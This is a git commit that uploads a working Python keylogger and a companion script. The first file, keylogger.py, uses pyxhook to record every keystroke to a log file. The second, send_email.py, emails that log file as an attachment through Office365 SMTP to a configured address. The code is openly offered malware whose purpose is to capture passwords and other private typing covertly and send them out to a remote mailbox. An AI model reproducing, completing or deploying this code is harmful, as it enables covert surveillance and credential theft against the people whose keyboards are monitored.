38b26df4fa47a6cd0cf64865e0e7c9811d8059f7
catfrd <100594122+catfrd@users.noreply.github.com>
2023-03-10 19:44:25 +0530

    Add files via upload

---
+++ keylogger.py
@@ -0,0 +1,40 @@
+import os 
+import pyxhook 
+
+log_file = os.environ.get( 
+    'pylogger_file', 
+    os.path.expanduser('') #path of the file to be stored
+) 
+cancel_key = ord( 
+    os.environ.get( 
+        'pylogger_cancel', 
+        '`'
+    )[0] 
+) 
+  
+  #defining a file for keylogs
+if os.environ.get('pylogger_clean', None) is not None: 
+    try: 
+        os.remove(log_file) 
+    except EnvironmentError:  
+        pass
+  
+#creating key pressing event and saving it into log file 
+def OnKeyPress(event): 
+    with open(log_file, 'a') as f: 
+        f.write('{}\n'.format(event.Key)) 
+  
+# create a hook manager object 
+new_hook = pyxhook.HookManager() 
+new_hook.KeyDown = OnKeyPress 
+# set the hook 
+new_hook.HookKeyboard() 
+try: 
+    new_hook.start()    # start the hook 
+except KeyboardInterrupt: 
+    pass
+except Exception as ex: 
+    msg = 'Error while catching events:\n  {}'.format(ex) 
+    pyxhook.print_err(msg) 
+    with open(log_file, 'a') as f: 
+        f.write('{}'.format(msg)) 
---
+++ send_email.py
@@ -0,0 +1,40 @@
+
+import smtplib
+from email.mime.text import MIMEText
+from email.mime.multipart import MIMEMultipart
+from email.mime.base import MIMEBase
+from email import encoders
+
+#put your gmail id, password, sender address over here
+
+email_user = '......@outlook.com' #enter outlook mailid
+email_password = 'enter password'
+email_send = '......@outlook.com' #enter outlook mailid
+
+subject = 'enter subject'
+
+
+msg = MIMEMultipart()
+msg['From'] = email_user
+msg['To'] = email_send
+msg['Subject'] = subject
+body = 'log file'
+msg.attach(MIMEText(body,'plain'))
+filename='file.log'
+attachment =open(filename,'rb')
+
+part = MIMEBase('application','octet-stream')
+part.set_payload((attachment).read())
+encoders.encode_base64(part)
+part.add_header('Content-Disposition',"attachment; filename= "+filename)
+
+msg.attach(part)
+text = msg.as_string()
+server = smtplib.SMTP('smtp.office365.com',587) #write the correct port no. and smtp corresponding to the email
+server.starttls()
+server.login(email_user,email_password)
+
+
+server.sendmail(email_user,email_send,text)
+server.quit()
+
